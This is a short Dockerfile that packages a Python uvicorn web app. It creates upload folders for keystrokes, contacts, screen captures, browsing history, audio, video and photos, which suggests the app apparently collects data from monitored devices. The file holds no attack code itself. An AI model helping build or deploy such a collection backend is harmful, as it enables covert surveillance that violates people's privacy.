FROM python:3.11-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Création du dossier pour les uploads
RUN mkdir -p uploads/logs uploads/media uploads/photos uploads/audio uploads/video uploads/screen uploads/contacts uploads/history uploads/keystrokes

EXPOSE 8000

CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
